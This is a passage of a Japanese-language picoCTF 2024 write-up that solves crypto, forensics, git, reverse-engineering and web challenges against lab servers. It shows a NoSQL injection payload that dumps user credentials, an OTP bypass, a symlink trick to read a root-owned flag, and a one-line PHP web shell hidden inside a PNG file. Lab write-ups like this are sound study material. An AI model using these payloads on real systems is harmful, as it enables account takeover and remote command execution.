    if v &gt; 1:
        return False
    else:
        return True


def decrypt(cipher, key):
    plain = &quot;&quot;
    for char in cipher:
        p = (char // 311) // key
        plain += chr(p)
    return plain


def semi_decrypt(cipher, key):
    cipher_list = list(cipher)
    cipher_list.reverse()
    cipher = &quot;&quot;.join(cipher_list)
    plain = &quot;&quot;
    key_length = len(key)
    for i, char in enumerate(cipher[::-1]):
        key_char = key[i % key_length]
        print(f&quot;key_char: {ord(key_char)}&quot;)
        print(f&quot;ec: {ord(char)}&quot;)
        decrypted_char = chr(ord(char) ^ ord(key_char))
        print(f&quot;decrypted_char: {ord(decrypted_char)}&quot;)
        plain += decrypted_char
    return plain


a = 94
b = 29
cipher = [
    260307,
    491691,
    491691,
    2487378,
    2516301,
    0,
    1966764,
    1879995,
    1995687,
    1214766,
    0,
    2400609,
    607383,
    144615,
    1966764,
    0,
    636306,
    2487378,
    28923,
    1793226,
    694152,
    780921,
    173538,
    173538,
    491691,
    173538,
    751998,
    1475073,
    925536,
    1417227,
    751998,
    202461,
    347076,
    491691,
]

p = 97
g = 31
text_key = &quot;trudeau&quot;

u = generator(g, a, p)
v = generator(g, b, p)
key = generator(v, a, p)
b_key = generator(u, b, p)

shared_key = None
if key == b_key:
    shared_key = key
else:
    print(&quot;Invalid key&quot;)
    exit()

semi_cipher = decrypt(cipher, shared_key)
plain = semi_decrypt(semi_cipher, text_key)
plain_list = list(plain)
plain_list.reverse()
print(&quot;&quot;.join(plain_list))
</code></pre>
<h1>Forensic</h1>
<h2>scan surprise</h2>
<p>QRコードを渡されたので素直に読み取る。</p>
<pre><code>picoCTF{p33k_@_b00_a81f0a35}
</code></pre>
<h2>verify</h2>
<p>sshでアクセスするとホームディレクトリにはこんなファイル群を含むdrop-inというディレクトリがあった。</p>
<pre><code>.
./checksum.txt
./decrypt.sh
./files
./files/00011a60
./files/022cvpdN
./files/04nLilRD
./files/0MT2Wrui
...他にもたくさん
</code></pre>
<p>files内のファイルのどれかをdecrypt.shで復元すれば良さそう。
仲間はずれ探しをしてみる。</p>
<pre><code>file $(find .)
</code></pre>
<p>そうすると仲間はずれが見つかった。</p>
<pre><code>./00011a60: openssl enc'd data with salted password
./022cvpdN: ASCII text
./04nLilRD: ASCII text
./0MT2Wrui: Motorola S-Record; binary data in text format
./0SGMttmR: ASCII text
./0fCDySFB: ASCII text
./0hHVJSPh: ASCII text
...他にもたくさん
</code></pre>
<p>一番始めを解読してみるとフラグを獲得できた。</p>
<pre><code class="language-bash">./decrypt.sh files/00011a60
</code></pre>
<pre><code>picoCTF{trust_but_verify_00011a60}
</code></pre>
<h2>canyousee</h2>
<p><code>ukn_reality.jpg</code>というjpgファイルを渡された。exiftoolでメタデータを見てみる。</p>
<pre><code class="language-bash">exiftool ukn_reality.jpg
</code></pre>
<pre><code>ExifTool Version Number         : 12.76
File Name                       : ukn_reality.jpg
Directory                       : .
File Size                       : 2.3 MB
File Modification Date/Time     : 2024:02:16 07:40:21+09:00
File Access Date/Time           : 2024:04:07 16:19:07+09:00
File Inode Change Date/Time     : 2024:03:13 16:15:33+09:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 72
Y Resolution                    : 72
XMP Toolkit                     : Image::ExifTool 11.88
Attribution URL                 : cGljb0NURntNRTc0RDQ3QV9ISUREM05fYTZkZjhkYjh9Cg==
Image Width                     : 4308
Image Height                    : 2875
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 4308x2875
Megapixels                      : 12.4
</code></pre>
<p>怪しいbase64っぽい文字列が見えたのでデコードしてみる。</p>
<pre><code class="language-bash">echo cGljb0NURntNRTc0RDQ3QV9ISUREM05fYTZkZjhkYjh9Cg== | base64 -d
</code></pre>
<pre><code>picoCTF{ME74D47A_HIDD3N_a6df8db8}
</code></pre>
<h2>secret of the polyglot</h2>
<p><code>flag2of2-final.pdf</code>というpdfファイルが渡された。<code>file</code>で調べるとこのファイルはpngらしい。<a href="https://artifacts.picoctf.net/c_titan/96/flag2of2-final.pdf">pdfとして開いてみると</a>、フラグの後半が獲得できる。
pngとして開いてみると前半が手に入る。</p>
<pre><code>picoCTF{f1u3n7_1n_pn9_&amp;_pdf_90974127}
</code></pre>
<h2>mob psycho</h2>
<p>apkファイルが渡されたのでapktoolで展開してみる。
この後いろいろ探したのだが、手がかりが見つからなかった。
よって、展開の各段階ごと調べていく。
まずはunzipしてdexファイル群の段階にする。そのこのファイル群を調べていたら、<code>res/color/flag.txt</code>を見つけた。</p>
<h2>endianness-v2</h2>
<p>謎のバイナリデータを渡された。問題文に、32bitシステム上から取得されたデータであると書いてあったので、メモリダンプだと予想し、データを4バイトずつ反転してみることにした。</p>
<pre><code class="language-python">#!/usr/bin/env python

with open(&quot;./file&quot;, &quot;rb&quot;) as f:
    data = list(f.read())

output = []

print(len(data))
for i in range(0, len(data) // 4, 1):
    each = data[i * 4 : i * 4 + 4]
    each.reverse()
    for j in each:
        output.append(j)


with open(&quot;./file.out&quot;, &quot;wb&quot;) as f:
    f.write(bytes(output))
</code></pre>
<p>予想通りメモリダンプだった。デコードした結果フラグが写ったjpegファイルが生成された。</p>
<h1>General Skills</h1>
<h2>super ssh</h2>
<p>sshサーバーにアクセスしたらフラグが出力されて通信が切れた。</p>
<pre><code>ssh -p 53176 ctf-player@titan.picoctf.net
</code></pre>
<pre><code>ctf-player@titan.picoctf.net's password:
Welcome ctf-player, here's your flag: picoCTF{s3cur3_c0nn3ct10n_8969f7d3}
Connection to titan.picoctf.net closed.
</code></pre>
<h2>commitment issues</h2>
<p>gitリポジトリが配られた。
とりあえずログを見る。</p>
<pre><code class="language-bash">git log
</code></pre>
<pre><code>commit e1237df82d2e69f62dd53279abc1c8aeb66f6d64 (HEAD -&gt; master)
Author: picoCTF &lt;ops@picoctf.com&gt;
Date:   Sat Mar 9 21:10:14 2024 +0000

    remove sensitive info

commit 3d5ec8a26ee7b092a1760fea18f384c35e435139
Author: picoCTF &lt;ops@picoctf.com&gt;
Date:   Sat Mar 9 21:10:14 2024 +0000

    create flag
</code></pre>
<p><code>3d5ec8a26ee7b092a1760fea18f384c35e435139</code>このコミットでフラグが作られたらしい。</p>
<pre><code>git checkout 3d5ec8a26ee7b092a1760fea18f384c35e435139
cat message.txt
</code></pre>
<pre><code>picoCTF{s@n1t1z3_30e86d36}
</code></pre>
<h2>time machine</h2>
<p>gitリポジトリが配られた。logを見たら、メッセージがフラグのコミットがあった。</p>
<pre><code>git log
</code></pre>
<pre><code>commit 705ff639b7846418603a3272ab54536e01e3dc43 (HEAD -&gt; master)
Author: picoCTF &lt;ops@picoctf.com&gt;
Date:   Sat Mar 9 21:10:36 2024 +0000

    picoCTF{t1m3m@ch1n3_b476ca06}
</code></pre>
<h2>blame game</h2>
<p>gitリポジトリが配られた。logを見たらフラグがコミットしていた。</p>
<pre><code>git log
</code></pre>
<pre><code>...他にもたくさん
commit ccf857444761e8380204eafd76e677f9e7e71a94
Author: picoCTF &lt;ops@picoctf.com&gt;
Date:   Sat Mar 9 21:09:25 2024 +0000

    important business work

commit 0fe87f16cbd8129ed5f7cf2f6a06af6688665728
Author: picoCTF{@sk_th3_1nt3rn_ea346835} &lt;ops@picoctf.com&gt;
Date:   Sat Mar 9 21:09:25 2024 +0000

    optimize file size of prod code

commit 7e8a2415b6cca7d0d0002ff0293dd384b5cc900d
Author: picoCTF &lt;ops@picoctf.com&gt;
Date:   Sat Mar 9 21:09:25 2024 +0000

    create top secret project
</code></pre>
<h2>collaborative development</h2>
<p>gitリポジトリが配られた。怪しげなブランチがあった。</p>
<pre><code>git branch --list
</code></pre>
<pre><code>* (HEAD detached at 74ae521)
  feature/part-1
  feature/part-2
  feature/part-3
  main
</code></pre>
<p>part-1、part-2、part-3で得られる文字列をつなげたらフラグが得られた。
feature/part-1:</p>
<pre><code>print(&quot;Printing the flag...&quot;)
print(&quot;picoCTF{t3@mw0rk_&quot;, end='')
</code></pre>
<p>feature/part-2</p>
<pre><code>print(&quot;Printing the flag...&quot;)

print(&quot;m@k3s_th3_dr3@m_&quot;, end='')
</code></pre>
<p>feature/part-3</p>
<pre><code>print(&quot;Printing the flag...&quot;)

print(&quot;w0rk_4c24302f}&quot;)
</code></pre>
<p>つなげると</p>
<pre><code>picoCTF{t3@mw0rk_m@k3s_th3_dr3@m_w0rk_4c24302f}
</code></pre>
<h2>binhexa</h2>
<p>サーバーにアクセスしたら、ビット演算クイズがいくつか出題された。全部正解したらフラグが得られた。</p>
<h2>binary search</h2>
<p>範囲が0~1000までのランダムな値を二分探索で当てる問題。数字を渡すことでその数字が正解の数字よりも大きいか小さいかを教えてくれる。この試行は10回だけできる。
インタラクティブシェルで以下のような関数を定義すると便利。</p>
<pre><code>def m(x,y):
     return (x+y)//2
</code></pre>
<h2>endianness</h2>
<p>与えられた文字列を指定されたエンディアンに直して、その16進数文字列を渡せばよい。</p>
<h2>dont-you-love-banners</h2>
<p>２つのサーバーが立ち上がり、一つにアクセスすると以下のようにパスワードを得られた。</p>
<pre><code>nc tethys.picoctf.net 58148
</code></pre>
<pre><code>SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
</code></pre>
<p>次にもう一つのサーバーにアクセスしてさっきリークしたパスワードを入力する。
そうするといくつかのサイバーセキュリティ業界に関するクイズが出題された。
クイズに全て正解するとシェルを得られた。</p>
<pre><code> nc tethys.picoctf.net 50699
</code></pre>
<pre><code>*************************************
**************WELCOME****************
*************************************


what is the password?
My_Passw@rd_@1234
What is the top cyber security conference in the world?
defcon
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper
player@challenge:~$ ls banner
*************************************
**************WELCOME****************
*************************************
</code></pre>
<p>サーバーを探索すると<code>/root/flag.txt</code>を見つけたが権限不足で中身を見ることはできなかった。
しかし、ホームディレクトリにあった<code>banner</code>ファイル内の文字列がサーバーアクセス時に出力されていそうなことと、<code>ps aux</code>の結果から、プログラムがroot権限で実行されていることがわかった。だから<code>banner</code>を<code>/root/flag.txt</code>へのシンボリックリンクに設定することでもう一度サーバーにアクセスしたときにフラグが出力されるようにできた。</p>
<pre><code> nc tethys.picoctf.net 50699
</code></pre>
<pre><code>picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_8126c9b0}

what is the password?
</code></pre>
<h1>Reverse Engineering</h1>
<h2>packer</h2>
<p><code>out</code>という実行ファイルが配られた。問題名からパッキングされてそうだと推測した。</p>
<pre><code>strings out
</code></pre>
<pre><code>...他にもたくさん
.bssh
?p! _
H_db
UPX!
UPX!
</code></pre>
<p>stringsでみたらUPXでパッキングされていることがわかった。</p>
<pre><code>upx -d out
</code></pre>
<p>デパッキングしてstringsでフラグを探してみたが見つからないので、gdbでプログラムの実行を追ってみる。
ディスアセンブルすると怪しげなメモリ書き込みが見つかったので、全て書き込まれた段階でそのメモリを見てみる。</p>
<pre><code>...省略
0x0000000000401e33 &lt;+206&gt;:   mov    QWORD PTR [rbp-0x88],rax
0x0000000000401e3a &lt;+213&gt;:   movabs rax,0x6636333639363037
0x0000000000401e44 &lt;+223&gt;:   movabs rdx,0x6237363434353334
0x0000000000401e4e &lt;+233&gt;:   mov    QWORD PTR [rbp-0x80],rax
0x0000000000401e52 &lt;+237&gt;:   mov    QWORD PTR [rbp-0x78],rdx
0x0000000000401e56 &lt;+241&gt;:   movabs rax,0x6635383539333535
0x0000000000401e60 &lt;+251&gt;:   movabs rdx,0x3433303565363535
0x0000000000401e6a &lt;+261&gt;:   mov    QWORD PTR [rbp-0x70],rax
0x0000000000401e6e &lt;+265&gt;:   mov    QWORD PTR [rbp-0x68],rdx
0x0000000000401e72 &lt;+269&gt;:   movabs rax,0x6534313362363336
0x0000000000401e7c &lt;+279&gt;:   movabs rdx,0x3133323466353633
0x0000000000401e86 &lt;+289&gt;:   mov    QWORD PTR [rbp-0x60],rax
0x0000000000401e8a &lt;+293&gt;:   mov    QWORD PTR [rbp-0x58],rdx
0x0000000000401e8e &lt;+297&gt;:   movabs rax,0x3936323534336536
0x0000000000401e98 &lt;+307&gt;:   movabs rdx,0x3333663533353333
0x0000000000401ea2 &lt;+317&gt;:   mov    QWORD PTR [rbp-0x50],rax
0x0000000000401ea6 &lt;+321&gt;:   mov    QWORD PTR [rbp-0x48],rdx
0x0000000000401eaa &lt;+325&gt;:   movabs rax,0x3136313631333733
0x0000000000401eb4 &lt;+335&gt;:   movabs rdx,0x6437363636363933
0x0000000000401ebe &lt;+345&gt;:   mov    QWORD PTR [rbp-0x40],rax
0x0000000000401ec2 &lt;+349&gt;:   mov    QWORD PTR [rbp-0x38],rdx
0x0000000000401ec6 &lt;+353&gt;:   mov    QWORD PTR [rbp-0x30],0x0
...省略
pwndbg&gt; x/sb $rbp-0x80
0x7fffffffdfa0: &quot;7069636f4354467b5539585f556e5034636b314e365f42316e34526933535f33373161613966667dX\341\377\377\377\177&quot;
</code></pre>
<p><code>7069636f4354467b5539585f556e5034636b314e365f42316e34526933535f33373161613966667d</code>をasciiに変換すればフラグが得られた。<code>picoCTF{U9X_UnP4ck1N6_B1n4Ri3S_371aa9ff}</code></p>
<h2>factcheck</h2>
<p><code>bin</code>という実行ファイルを渡された。
stringsでフラグを探したが、</p>
<pre><code>strings bin | grep pico
</code></pre>
<pre><code>picoCTF{wELF_d0N3_mate_
</code></pre>
<p>一部しか見つからなかったのででコンパイルした。
コンパイルしてもあんまり意味がわからなかったのだが、どこかの領域に<code>picoCTF{wELF_d0N3_mate_</code>を書き込んだ後に、長い処理を行っていたのでgdbで処理を追ってみることにした。フラグが書き込まれた領域を監視しながら<code>main</code>の処理を一つずつ実行していったらフラグを得ることができた。<code>picoCTF{wELF_d0N3_mate_e9da2c0e}</code></p>
<h2>classic crackme 0x100</h2>
<p>配られた<code>crackme100</code>をデコンパイルして簡略化すると以下のようになる</p>
<pre><code class="language-c">for i in range(3):
  for j in range(length) {
    local_28 = (j % 0xFF &gt;&gt; 1 &amp; 85) + (j % 0xFF &amp; 85)
    local_2c = (local_28 &gt;&gt; 2 &amp; 51) + (51 &amp; local_28)
	
	A = local_2c &gt;&gt; 4 &amp; 15
    B = 15 &amp; local_2c

	iVar1 = A + ord(input[j]) - 97 + B
    input[j] = chr(97 + iVar1 % 0x1A)
  }
}
if input == &quot;lxpyrvmgduiprervmoqkvfqrblqpvqueeuzmpqgycirxthsjaw&quot;:
  print(&quot;flag{hello!}&quot;)
</code></pre>
<p>よく見ると<code>local_2c</code>は<code>local_28</code>にのみ依存していて、<code>local_28</code>は<code>j</code>のみに依存している。よって、<code>local_2c</code>と<code>local_28</code>はそのまま解読スクリプトに組み込めば良い。
次にiVar1を特定したい。<code>input[j] = chr(ord(&quot;a&quot;) + iVar1 % 0x1A)</code>より、
<code>iVar1 % 0x1A = input[j] - 97</code>であるから、0x1Aで割ったあまりが<code>input[j] - 97</code>と等しくなるまで総当りしてiVar1を求める。iVar1を求めることができれば、もともとのinput[j]も単純な式変形だけで求めることができる。</p>
<pre><code class="language-python">#!/usr/bin/env python


passwd = &quot;lxpyrvmgduiprervmoqkvfqrblqpvqueeuzmpqgycirxthsjaw&quot;
length = len(passwd)


def encode(lst: list):
    for i in range(3):
        for j in range(length):
            local_28 = (j % 0xFF &gt;&gt; 1 &amp; 85) + (j % 0xFF &amp; 85)
            local_2c = (local_28 &gt;&gt; 2 &amp; 51) + (51 &amp; local_28)

            A = local_2c &gt;&gt; 4 &amp; 15
            B = 15 &amp; local_2c

            iVar1 = A + ord(lst[j]) - 97 + B

            lst[j] = chr(ord(&quot;a&quot;) + iVar1 % 0x1A)
    return &quot;&quot;.join(lst)


def decode(lst: list):
    for i in range(3):
        for j in range(length):
            local_28 = (j % 0xFF &gt;&gt; 1 &amp; 85) + (j % 0xFF &amp; 85)
            local_2c = (local_28 &gt;&gt; 2 &amp; 51) + (51 &amp; local_28)

            A = local_2c &gt;&gt; 4 &amp; 15
            B = 15 &amp; local_2c

            enc = ord(lst[j])
            for x in range(97, 123):
                if (enc - 97) == (A + B + x - 97) % 26:
                    lst[j] = chr(x)
    return &quot;&quot;.join(lst)


print(decode(list(passwd)))
</code></pre>
<pre><code>./solve.py | ./crackme100
</code></pre>
<pre><code>Enter the secret password: SUCCESS! Here is your flag: picoCTF{sample_flag}
</code></pre>
<h1>Web Exploitation</h1>
<h2>bookmarklet</h2>
<p>サイトにアクセスしてコピーできるjavascriptコードを開発者ツールのConsoleで実行するとフラグを得られる。</p>
<h2>webdecode</h2>
<p>ソースコードを調査した結果<code>/about.html</code>に怪しげなタグを見つけた。</p>
<pre><code class="language-html">&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;
 &lt;head&gt;
  &lt;meta charset=&quot;utf-8&quot;/&gt;
  &lt;meta content=&quot;IE=edge&quot; http-equiv=&quot;X-UA-Compatible&quot;/&gt;
  &lt;meta content=&quot;width=device-width, initial-scale=1.0&quot; name=&quot;viewport&quot;/&gt;
  &lt;link href=&quot;[style.css](view-source:http://titan.picoctf.net:54581/style.css)&quot; rel=&quot;stylesheet&quot;/&gt;
  &lt;link href=&quot;[img/favicon.png](view-source:http://titan.picoctf.net:54581/img/favicon.png)&quot; rel=&quot;shortcut icon&quot; type=&quot;image/x-icon&quot;/&gt;
  &lt;!-- font (google) --&gt;
  &lt;link href=&quot;[https://fonts.googleapis.com/css2?family=Lato:ital,wght@0,400;0,700;1,400&amp;amp;display=swap](view-source:https://fonts.googleapis.com/css2?family=Lato:ital,wght@0,400;0,700;1,400&amp;display=swap)&quot; rel=&quot;stylesheet&quot;/&gt;
  &lt;title&gt;
   About me
  &lt;/title&gt;
 &lt;/head&gt;
 &lt;body&gt;
  &lt;header&gt;
   &lt;nav&gt;
    &lt;div class=&quot;logo-container&quot;&gt;
     &lt;a href=&quot;[index.html](view-source:http://titan.picoctf.net:54581/index.html)&quot;&gt;
      &lt;img alt=&quot;logo&quot; src=&quot;[img/binding_dark.gif](view-source:http://titan.picoctf.net:54581/img/binding_dark.gif)&quot;/&gt;
     &lt;/a&gt;
    &lt;/div&gt;
    &lt;div class=&quot;navigation-container&quot;&gt;
     &lt;ul&gt;
      &lt;li&gt;
       &lt;a href=&quot;[index.html](view-source:http://titan.picoctf.net:54581/index.html)&quot;&gt;
        Home
       &lt;/a&gt;
      &lt;/li&gt;
      &lt;li&gt;
       &lt;a href=&quot;[about.html](view-source:http://titan.picoctf.net:54581/about.html)&quot;&gt;
        About
       &lt;/a&gt;
      &lt;/li&gt;
      &lt;li&gt;
       &lt;a href=&quot;[contact.html](view-source:http://titan.picoctf.net:54581/contact.html)&quot;&gt;
        Contact
       &lt;/a&gt;
      &lt;/li&gt;
     &lt;/ul&gt;
    &lt;/div&gt;
   &lt;/nav&gt;
  &lt;/header&gt;
  &lt;section class=&quot;about&quot; notify_true=&quot;cGljb0NURnt3ZWJfc3VjYzNzc2Z1bGx5X2QzYzBkZWRfZjZmNmI3OGF9&quot;&gt;
   &lt;h1&gt;
    Try inspecting the page!! You might find it there
   &lt;/h1&gt;
   &lt;!-- .about-container --&gt;
  &lt;/section&gt;
  &lt;!-- .about --&gt;
  &lt;section class=&quot;why&quot;&gt;
   &lt;footer&gt;
    &lt;div class=&quot;bottombar&quot;&gt;
     Copyright © 2023 Your_Name. All rights reserved.
    &lt;/div&gt;
   &lt;/footer&gt;
  &lt;/section&gt;
 &lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p><code>&lt;section class=&quot;about&quot; notify_true=&quot;cGljb0NURnt3ZWJfc3VjYzNzc2Z1bGx5X2QzYzBkZWRfZjZmNmI3OGF9&quot;&gt;</code>この部分。
この<code>cGljb0NURnt3ZWJfc3VjYzNzc2Z1bGx5X2QzYzBkZWRfZjZmNmI3OGF9</code>をcyberchefのmagicでデコードしてみるとフラグが得られる。<code>picoCTF{web_succ3ssfully_d3c0ded_f6f6b78a}</code></p>
<h2>introtoburp</h2>
<p><code>/</code>にアクセスすると、ユーザー登録ができるようになっている。
登録が終わると2fa authenticationを促される。適当な文字を入れてみると</p>
<pre><code class="language-http">POST /dashboard HTTP/1.1
Host: titan.picoctf.net:59216
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: ja,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 5
Origin: http://titan.picoctf.net:59216
Connection: close
Referer: http://titan.picoctf.net:59216/dashboard
Cookie: session=.eJw1jUsKAjEQRO-StYuZtB0TLxPy6aA4k4R8EBHvbg_orupBvXqLcB8vcRVOnEToLdlRHpQZnD2QRBVhRSP9EiI6ZULQJgKAkbRA0gsa4l2a22az2-nwHKIyKscLakTFtbren6XF3029lUw2z91TY7RKYDg7tb9CfL4ZTyxp.ZhKVUw.kftc7Wq4rCGqCMsxLzwS-v9g4jg
Upgrade-Insecure-Requests: 1

otp=a
</code></pre>
<p>このようなリクエストがなされる。
色々試してみたが、全くわからなかったのでヒントを見てみた。ヒントいわくリクエストをぐちゃぐちゃにしてみろとのこと。だから素直に変なリクエストを送ってみた(データなしでPOSTしてみた)。</p>
<pre><code class="language-http">POST /dashboard HTTP/1.1
Host: titan.picoctf.net:59216
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: ja,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 5
Origin: http://titan.picoctf.net:59216
Connection: close
Referer: http://titan.picoctf.net:59216/dashboard
Cookie: session=.eJw1jUsKAjEQRO-StYuZtB0TLxPy6aA4k4R8EBHvbg_orupBvXqLcB8vcRVOnEToLdlRHpQZnD2QRBVhRSP9EiI6ZULQJgKAkbRA0gsa4l2a22az2-nwHKIyKscLakTFtbren6XF3029lUw2z91TY7RKYDg7tb9CfL4ZTyxp.ZhKVUw.kftc7Wq4rCGqCMsxLzwS-v9g4jg
Upgrade-Insecure-Requests: 1
</code></pre>
<p>そうしたらフラグが得られた。</p>
<pre><code class="language-http">HTTP/1.1 200 OK
Server: Werkzeug/3.0.1 Python/3.8.10
Date: Sun, 07 Apr 2024 12:45:51 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 102
Vary: Cookie
Connection: close

Welcome, a you sucessfully bypassed the OTP request. 
Your Flag: picoCTF{#0TP_Bypvss_SuCc3$S_3e3ddc76}
</code></pre>
<p>おもんないね。</p>
<h2>unminify</h2>
<p>サイトにアクセスしたらこのようなメッセージがあったので</p>
<blockquote>
<p>If you're reading this, your browser has succesfully received the flag.</p>
<p>I just deliver flags, I don't know how to read them...</p>
</blockquote>
<pre><code class="language-html">&lt;!doctype html&gt;
&lt;html lang=&quot;en&quot;&gt;

&lt;head&gt;
    &lt;meta charset=&quot;utf-8&quot;&gt;
    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,initial-scale=1&quot;&gt;
    &lt;title&gt;picoCTF - picoGym | Unminify Challenge&lt;/title&gt;
    &lt;link rel=&quot;icon&quot; type=&quot;image/png&quot; sizes=&quot;32x32&quot; href=&quot;/favicon-32x32.png&quot;&gt;
    &lt;style&gt;
        body {
            font-family: &quot;Lucida Console&quot;, Monaco, monospace
        }

        h1,
        p {
            color: #000
        }
    &lt;/style&gt;
&lt;/head&gt;

&lt;body class=&quot;picoctf{}&quot; style=&quot;margin:0&quot;&gt;
    &lt;div class=&quot;picoctf{}&quot; style=&quot;margin:0;padding:0;background-color:#757575;display:auto;height:40%&quot;&gt;&lt;a
            class=&quot;picoctf{}&quot; href=&quot;/&quot;&gt;&lt;img src=&quot;picoctf-logo-horizontal-white.svg&quot; alt=&quot;picoCTF logo&quot;
                style=&quot;display:inline-block;width:160px;height:90px;padding-left:30px&quot;&gt;&lt;/a&gt;&lt;/div&gt;
    &lt;center&gt;&lt;br class=&quot;picoctf{}&quot;&gt;&lt;br class=&quot;picoctf{}&quot;&gt;
        &lt;div class=&quot;picoctf{}&quot;
            style=&quot;padding-top:30px;border-radius:3%;box-shadow:0 5px 10px #0000004d;width:50%;align-self:center&quot;&gt;&lt;img
                class=&quot;picoctf{}&quot; src=&quot;hero.svg&quot; alt=&quot;flag art&quot; style=&quot;width:150px;height:150px&quot;&gt;
            &lt;div class=&quot;picoctf{}&quot; style=&quot;width:85%&quot;&gt;
                &lt;h2 class=&quot;picoctf{}&quot;&gt;Welcome to my flag distribution website!&lt;/h2&gt;
                &lt;div class=&quot;picoctf{}&quot; style=&quot;width:70%&quot;&gt;
                    &lt;p class=&quot;picoctf{}&quot;&gt;If you're reading this, your browser has succesfully received the flag.&lt;/p&gt;
                    &lt;p class=&quot;picoCTF{pr3tty_c0d3_ed938a7e}&quot;&gt;&lt;/p&gt;
                    &lt;p class=&quot;picoctf{}&quot;&gt;I just deliver flags, I don't know how to read them...&lt;/p&gt;
                &lt;/div&gt;
            &lt;/div&gt;&lt;br class=&quot;picoctf{}&quot;&gt;
        &lt;/div&gt;
    &lt;/center&gt;
&lt;/body&gt;

&lt;/html&gt;⏎  
</code></pre>
<p>ソースコードを調べてみたらフラグが見つかった。
<code>picoCTF{pr3tty_c0d3_ed938a7e}</code></p>
<h2>no sql injection</h2>
<p>サイトのソースコードが配られた。
サイトにアクセスするとログインフォームが現れる。</p>
<pre><code class="language-js">import User from &quot;@/models/user&quot;;
import { connectToDB } from &quot;@/utils/database&quot;;
import { seedUsers } from &quot;@/utils/seed&quot;;

export const POST = async (req: any) =&gt; {
  const { email, password } = await req.json();
  try {
    await connectToDB();
    await seedUsers();
    const users = await User.find({
      email: email.startsWith(&quot;{&quot;) &amp;&amp; email.endsWith(&quot;}&quot;) ? JSON.parse(email) : email,
      password: password.startsWith(&quot;{&quot;) &amp;&amp; password.endsWith(&quot;}&quot;) ? JSON.parse(password) : password
    });

    if (users.length &lt; 1)
      return new Response(&quot;Invalid email or password&quot;, { status: 401 });
    else {
      return new Response(JSON.stringify(users), { status: 200 });
    }
  } catch (error) {
    return new Response(&quot;Internal Server Error&quot;, { status: 500 });
  }
};
</code></pre>
<p>ソースコード(api/login/route.ts)を見るとこのログインで渡された<code>email</code>や<code>password</code>が<code>&quot;{&quot;</code>で始まり<code>&quot;}&quot;</code>で終わる場合Jsonとして解釈するようになっていることがわかる。また、なんのサニタイズもなくクエリとして使っている。よってここにNo Sql Injectionの脆弱性がある。
リクエストをInterceptして、POSTデータを悪意のあるものに変えると、</p>
<pre><code class="language-http">POST /api/login HTTP/1.1
Host: atlas.picoctf.net:57221
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: */*
Accept-Language: ja,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: text/plain;charset=UTF-8
Content-Length: 60
Referer: http://atlas.picoctf.net:57221/
Origin: http://atlas.picoctf.net:57221
Connection: close

{&quot;email&quot;: &quot;{\&quot;$ne\&quot;: null}&quot;, &quot;password&quot;: &quot;{\&quot;$ne\&quot;: null}&quot; }
</code></pre>
<pre><code class="language-http">HTTP/1.1 200 OK
vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Accept-Encoding
content-type: text/plain;charset=UTF-8
date: Sun, 07 Apr 2024 13:04:13 GMT
connection: close
Content-Length: 237

[{&quot;_id&quot;:&quot;661298c3ac7c18084809dc5d&quot;,&quot;email&quot;:&quot;joshiriya355@mumbama.com&quot;,&quot;firstName&quot;:&quot;Josh&quot;,&quot;lastName&quot;:&quot;Iriya&quot;,&quot;password&quot;:&quot;Je80T8M7sUA&quot;,&quot;token&quot;:&quot;cGljb0NURntqQmhEMnk3WG9OelB2XzFZeFM5RXc1cUwwdUk2cGFzcWxfaW5qZWN0aW9uXzE0MzI5Y2ZhfQ==&quot;,&quot;__v&quot;:0}]
</code></pre>
<p>ユーザー情報を含んだレスポンスが返ってくる。tokenが怪しいと思ったのでbase64でデコードしたらフラグを得ることができた。<code>picoCTF{jBhD2y7XoNzPv_1YxS9Ew5qL0uI6pasql_injection_14329cfa}</code></p>
<h2>trickster</h2>
<p>画像をアップロードすることができるアプリケーションだ。
どんなファイルをアップロードできるか色々調べてみると、PNGのヘッダーが含まれていて、ファイル名に<code>.png</code>が含まれているものをアップロードすることができることがわかった。
よってpixloadというツールを使ってweb shellを提供する、PNGのふりをしたPHPファイルを作成して、それをつかってフラグを得た。</p>
<pre><code class="language-bash">pixload-png --payload &quot;&lt;?php system(\$_GET['cmd']); ?&gt;&quot; payload.png.php
</code></pre>
<pre><code class="language-bash">xxd payload.png.php
</code></pre>
<pre><code>00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR
00000010: 0000 0020 0000 0020 0802 0000 00fc 18ed  ... ... ........
00000020: a300 0000 0970 4859 7300 000e c400 000e  .....pHYs.......
00000030: c401 952b 0e1b 0000 0019 4944 4154 4889  ...+......IDATH.
00000040: edc1 3101 0000 00c2 a0f5 4fed 610d a000  ..1.......O.a...
00000050: 0000 6e0c 2000 01c8 a288 fe00 0000 0049  ..n. ..........I
00000060: 454e 44ae 4260 8200 0000 0000 0000 0000  END.B`..........
00000070: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000080: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000090: 0000 0000 0000 0000 0000 0000 0000 0000  ................
